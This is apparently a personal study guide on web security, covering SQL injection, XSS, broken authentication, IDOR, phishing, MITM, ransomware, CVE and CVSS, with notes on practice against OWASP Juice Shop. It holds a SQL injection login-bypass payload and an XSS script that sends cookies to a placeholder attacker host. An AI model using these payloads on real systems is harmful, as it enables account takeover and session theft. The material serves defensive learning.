# OWASP Top 10, Attack Types and CVE/CVSS

> Quick reference notes on web vulnerabilities, common attack types and vulnerability management.
> Covered through OWASP Juice Shop hands-on practice and personal study.

---

## OWASP Top 10

OWASP (Open Web Application Security Project) is a non-profit that publishes
free security research. Their Top 10 is a list of the most critical web
application vulnerabilities updated every few years based on real data from
thousands of organizations. Every security professional knows this list.

Focus areas for interviews: SQLi, XSS, Broken Auth, IDOR.

---

## SQLi: SQL Injection

Injecting SQL code into a form input to manipulate the database because the
app never validated what the user typed.

How it works:
```sql
Normal query:
SELECT * FROM users WHERE email = 'user@test.com' AND password = 'abc'

Injected input: ' OR 1=1 --
Result:
SELECT * FROM users WHERE email = '' OR 1=1 --' AND password = ''
```

OR 1=1 is always true. The double dash comments out the password check.
The database returns the first user, usually the admin.

Root cause: user input concatenated directly into SQL query without sanitizing.
Fix: use parameterized queries. Never build SQL by concatenating user input.

Confirmed in practice: logged in as admin@juice-sh.op on OWASP Juice Shop
using this exact payload without knowing the password.

OWASP category: Injection

---

## XSS: Cross-Site Scripting

Injecting a malicious script into a webpage so it executes in other users'
browsers because the app displayed user input without sanitizing it.

How it works:
```html
Input typed into search bar:
<iframe src="javascript:alert('XSS')">

The app renders this as HTML instead of displaying it as text.
The browser executes the script.
```

In a real attack the payload steals session cookies:
```html
<script>
document.location='http://attacker.com/steal?cookie='+document.cookie
</script>
```

Root cause: user input rendered directly as HTML without escaping it first.
Fix: escape special characters like < and > before displaying user input.

Confirmed in practice: triggered XSS alert popup on OWASP Juice Shop search bar.

OWASP category: Injection

---

## SQLi vs XSS

SQLi attacks the backend, the database, the server.
XSS attacks the frontend, the browsers of other users.

---

## Broken Authentication

Flaws in how a website verifies who you are, allowing attackers to bypass
login or steal other users' sessions.

Common examples:
- Weak passwords allowed (123456, password)
- No brute force protection, unlimited login attempts
- Session tokens not invalidated after logout
- Predictable session tokens (user_001, user_002...)
- Credentials in URLs

Fix: MFA, account lockout after failed attempts, strong random session tokens,
always invalidate tokens on logout.

OWASP category: Identification and Authentication Failures

---

## IDOR: Insecure Direct Object Reference

Accessing data you should not have access to by simply changing an ID in a
URL because the app never checked if you were authorized to see it.

Example:
```
You visit:   myshop.com/orders/1337  (your order)
You change:  myshop.com/orders/1336  (someone else's order)
The app shows it because it never checked if 1336 belongs to you.
```

Root cause: missing authorization check. The app fetches the record by ID
without verifying ownership.
Fix: always check if the logged in user owns or has permission to access the
requested object.

OWASP category: Broken Access Control

---

## Summary Table

| Vulnerability | What gets attacked | Root cause | Fix |
|---|---|---|---|
| SQLi | Database | Unsanitized input in SQL query | Parameterized queries |
| XSS | Other users browsers | Unsanitized input on page | Escape user input |
| Broken Auth | Login and sessions | Weak auth implementation | MFA, lockout, strong tokens |
| IDOR | Other users data | Missing authorization check | Check ownership before returning data |

---

## Phishing

Attacker sends a fake email, message, or website that looks legitimate to
trick someone into giving up credentials, clicking a malicious link, or
downloading malware.

Most successful cyberattacks start with phishing. It is the number one entry
point for ransomware and data breaches. No technical vulnerability needed,
just deception targeting humans.

---

## MITM: Man in the Middle

Attacker positions themselves between two communicating parties and intercepts
or modifies traffic without either side knowing.

Examples seen in practice: WPAD spoofing and ARP spoofing are both MITM
attacks. The attacker intercepts traffic by pretending to be a trusted
component like the router or proxy server.

HTTPS protects against MITM for web traffic. HTTP does not.

---

## DoS and DDoS

DoS (Denial of Service): overwhelm a system with traffic or requests until
it crashes or becomes too slow to use. Attacks availability in CIA terms.

DDoS (Distributed DoS): same concept but from thousands of machines
simultaneously via a botnet, making it much harder to block.

---

## Ransomware Lifecycle

Malware that encrypts all victim data and demands payment for the decryption key.

Each phase has detection opportunities:

1. Infiltration: attacker gets initial access via phishing or stolen credentials
2. Lateral Movement: attacker moves through the network to find valuable targets
3. Data Exfiltration: attacker steals data before encrypting (double extortion)
4. Encryption: ransomware deployed, all files encrypted
5. Ransom: note left demanding payment in cryptocurrency

Best defenses: backups, network segmentation, detect lateral movement early.

---

## CVE: Common Vulnerabilities and Exposures

A unique identifier assigned to every publicly known security vulnerability.

Format:
```
CVE-2021-44228
    YEAR  NUMBER
```

CVE-2021-44228 is Log4Shell, one of the most critical vulnerabilities ever
found. It allows remote code execution on any system using the Log4j Java
library, which was used by millions of applications worldwide.

The CVE system gives everyone a common language. Instead of describing a
vulnerability in words, everyone just uses the CVE number and everyone knows
exactly what you mean.

---

## CVSS: Common Vulnerability Scoring System

Assigns a severity score from 0 to 10 to each CVE based on how dangerous it is.

| Score | Severity |
|---|---|
| 0.0 | None |
| 0.1 to 3.9 | Low |
| 4.0 to 6.9 | Medium |
| 7.0 to 8.9 | High |
| 9.0 to 10.0 | Critical |

Score is calculated based on: how easy to exploit, requires authentication,
affects confidentiality/integrity/availability, exploitable remotely.

Log4Shell scored 10.0 — maximum. Remotely exploitable, no authentication
needed, full system control.

Why it matters for Deloitte: when they scan a client's systems and find 200
vulnerabilities they use CVSS scores to prioritize which ones to fix first.
Critical first, then high, then medium.

---

*Based on: OWASP Juice Shop hands-on practice, OWASP Top 10 documentation, personal study*
